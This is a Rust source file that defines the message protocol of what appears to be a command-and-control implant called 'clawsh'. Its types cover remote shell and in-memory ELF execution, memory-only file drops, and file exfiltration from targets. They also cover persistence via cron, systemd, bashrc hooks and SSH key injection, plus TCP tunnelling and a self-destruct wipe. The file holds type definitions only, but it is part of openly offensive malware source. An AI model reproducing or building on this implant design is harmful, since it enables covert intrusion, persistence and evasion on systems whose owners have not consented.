use serde::{Deserialize, Serialize};

use crate::noise::NoiseLevel;
use crate::types::*;

/// All message types in the clawsh protocol.
///
/// Each variant maps to a unique type ID for wire encoding.
/// The handler and implant both use this enum — it's the single
/// source of truth for what can be communicated.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Message {
    // ── Connection lifecycle (0x01–0x0F) ──────────────────────

    /// Agent → Handler: initial registration with agent metadata.
    Handshake(Handshake),

    /// Handler → Agent: accept connection, assign session ID, send config.
    HandshakeAck(HandshakeAck),

    /// Agent → Handler: alive signal with lightweight telemetry.
    Heartbeat(Heartbeat),

    /// Handler → Agent: heartbeat confirmed, optional piggyback config.
    HeartbeatAck(HeartbeatAck),

    // ── Task execution (0x10–0x1F) ────────────────────────────

    /// Handler → Agent: command/task to execute.
    TaskRequest(TaskRequest),

    /// Agent → Handler: structured result of task execution.
    TaskResponse(TaskResponse),

    /// Agent → Handler: streamed output chunk (for long-running tasks).
    TaskOutput(TaskOutput),

    // ── File transfer (0x20–0x2F) ─────────────────────────────

    /// Handler → Agent: initiate upload to target.
    FileUploadStart(FileUploadStart),

    /// Bidirectional: chunked file data.
    FileData(FileData),

    /// Bidirectional: transfer complete, final checksum.
    FileTransferComplete(FileTransferComplete),

    /// Handler → Agent: request file download from target.
    FileDownloadRequest(FileDownloadRequest),

    // ── Configuration (0x30–0x3F) ─────────────────────────────

    /// Handler → Agent: update runtime configuration.
    ConfigUpdate(ConfigUpdateMsg),

    /// Agent → Handler: acknowledge config change.
    ConfigAck(ConfigAck),

    // ── Module results (0x40–0x4F) ────────────────────────────

    /// Agent → Handler: structured reconnaissance result.
    ModuleOutput(ModuleResult),

    // ── Interactive shell (0x50–0x5F) ─────────────────────────

    /// Bidirectional: PTY I/O data.
    ShellData(ShellData),

    /// Handler → Agent: resize the PTY.
    ShellResize(ShellResize),

    /// Bidirectional: close the interactive shell.
    ShellClose(ShellClose),

    // ── Tunneling (0x60–0x6F) ──────────────────────────────────

    /// Handler → Agent: open a TCP connection to target.
    TunnelOpen(TunnelOpen),

    /// Bidirectional: relay data for a tunnel channel.
    TunnelData(TunnelData),

    /// Bidirectional: close a tunnel channel.
    TunnelClose(TunnelClose),

    /// Agent → Handler: tunnel channel connected (or failed).
    TunnelReady(TunnelReady),

    // ── Control (0xF0–0xFF) ───────────────────────────────────

    /// Handler → Agent: wipe everything and terminate.
    SelfDestruct,

    /// Agent → Handler: confirm self-destruct initiated.
    SelfDestructAck,

    /// Bidirectional: structured error.
    Error(ProtoErrorMsg),
}

impl Message {
    /// Wire type ID for framing.
    pub fn type_id(&self) -> u8 {
        match self {
            Message::Handshake(_) => 0x01,
            Message::HandshakeAck(_) => 0x02,
            Message::Heartbeat(_) => 0x03,
            Message::HeartbeatAck(_) => 0x04,
            Message::TaskRequest(_) => 0x10,
            Message::TaskResponse(_) => 0x11,
            Message::TaskOutput(_) => 0x12,
            Message::FileUploadStart(_) => 0x20,
            Message::FileData(_) => 0x21,
            Message::FileTransferComplete(_) => 0x22,
            Message::FileDownloadRequest(_) => 0x23,
            Message::ConfigUpdate(_) => 0x30,
            Message::ConfigAck(_) => 0x31,
            Message::ModuleOutput(_) => 0x40,
            Message::ShellData(_) => 0x50,
            Message::ShellResize(_) => 0x51,
            Message::ShellClose(_) => 0x52,
            Message::TunnelOpen(_) => 0x60,
            Message::TunnelData(_) => 0x61,
            Message::TunnelClose(_) => 0x62,
            Message::TunnelReady(_) => 0x63,
            Message::SelfDestruct => 0xF0,
            Message::SelfDestructAck => 0xF1,
            Message::Error(_) => 0xFF,
        }
    }

    /// Human-readable name for logging.
    pub fn name(&self) -> &'static str {
        match self {
            Message::Handshake(_) => "Handshake",
            Message::HandshakeAck(_) => "HandshakeAck",
            Message::Heartbeat(_) => "Heartbeat",
            Message::HeartbeatAck(_) => "HeartbeatAck",
            Message::TaskRequest(_) => "TaskRequest",
            Message::TaskResponse(_) => "TaskResponse",
            Message::TaskOutput(_) => "TaskOutput",
            Message::FileUploadStart(_) => "FileUploadStart",
            Message::FileData(_) => "FileData",
            Message::FileTransferComplete(_) => "FileTransferComplete",
            Message::FileDownloadRequest(_) => "FileDownloadRequest",
            Message::ConfigUpdate(_) => "ConfigUpdate",
            Message::ConfigAck(_) => "ConfigAck",
            Message::ModuleOutput(_) => "ModuleOutput",
            Message::ShellData(_) => "ShellData",
            Message::ShellResize(_) => "ShellResize",
            Message::ShellClose(_) => "ShellClose",
            Message::TunnelOpen(_) => "TunnelOpen",
            Message::TunnelData(_) => "TunnelData",
            Message::TunnelClose(_) => "TunnelClose",
            Message::TunnelReady(_) => "TunnelReady",
            Message::SelfDestruct => "SelfDestruct",
            Message::SelfDestructAck => "SelfDestructAck",
            Message::Error(_) => "Error",
        }
    }
}

// ── Message payloads ──────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Handshake {
    pub protocol_version: u8,
    pub agent_info: AgentInfo,
    /// HMAC-SHA256 over agent_info, keyed with PSK.
    pub auth_hmac: [u8; 32],
    /// X25519 public key for session key derivation.
    pub ephemeral_pubkey: [u8; 32],
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HandshakeAck {
    pub session_id: SessionId,
    pub config: AgentConfig,
    /// Handler's X25519 public key for session key derivation.
    pub ephemeral_pubkey: [u8; 32],
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Heartbeat {
    pub session_id: SessionId,
    pub timestamp: u64,
    pub pid: u32,
    pub uid: u32,
    pub idle_secs: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatAck {
    pub timestamp: u64,
    /// Optional config override piggybacked on heartbeat response.
    pub config_update: Option<AgentConfig>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskRequest {
    pub task_id: TaskId,
    pub noise_level: NoiseLevel,
    pub task: Task,
}

/// The actual task to perform.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Task {
    /// Run a built-in syscall command (ls, cat, etc.)
    Builtin { cmd: String, args: Vec<String> },

    /// Execute a shell command (Quiet/Loud only).
    ShellExec { command: String },

    /// Run a recon module by name.
    RunModule { name: String },

    /// Execute ELF binary in memory.
    ExecMem { elf_data: Vec<u8>, args: Vec<String> },

    /// Allocate interactive PTY shell (Loud only).
    InteractiveShell,

    /// Install, remove, or list persistence mechanisms.
    Persist(PersistRequest),

    /// Enter tunnel relay mode (Loud only).
    StartTunnelMode,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistRequest {
    pub method: PersistMethod,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PersistMethod {
    /// Cron job: @reboot + optional periodic interval.
    Cron { interval_minutes: Option<u32> },
    /// Systemd user or system service.
    Systemd,
    /// ~/.bashrc hook (background exec on login).
    Bashrc,
    /// SSH authorized_keys injection.
    SshKey { pubkey: String },
    /// Remove all installed persistence.
    Clean,
    /// List installed persistence.
    List,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResponse {
    pub task_id: TaskId,
    pub result: TaskResult,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskOutput {
    pub task_id: TaskId,
    pub stream: OutputStream,
    pub data: Vec<u8>,
    pub is_final: bool,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum OutputStream {
    Stdout,
    Stderr,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileUploadStart {
    pub file_info: FileInfo,
    /// If true, file goes to memfd (memory only). If false, write to disk path.
    pub memory_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileData {
    pub chunk: FileChunk,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileTransferComplete {
    pub path: String,
    pub sha256: [u8; 32],
    pub success: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDownloadRequest {
    pub remote_path: String,
    pub chunk_size: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellData {
    pub task_id: TaskId,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellResize {
    pub task_id: TaskId,
    pub cols: u16,
    pub rows: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellClose {
    pub task_id: TaskId,
    pub exit_code: Option<i32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigUpdateMsg {
    pub config: AgentConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigAck {
    pub applied: bool,
    pub message: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtoErrorMsg {
    pub code: u16,
    pub message: String,
    pub task_id: Option<TaskId>,
}

// ── Tunnel payloads ──────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelOpen {
    pub channel_id: ChannelId,
    pub target_host: String,
    pub target_port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelData {
    pub channel_id: ChannelId,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelClose {
    pub channel_id: ChannelId,
    pub reason: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelReady {
    pub channel_id: ChannelId,
    pub success: bool,
    pub error: Option<String>,
}
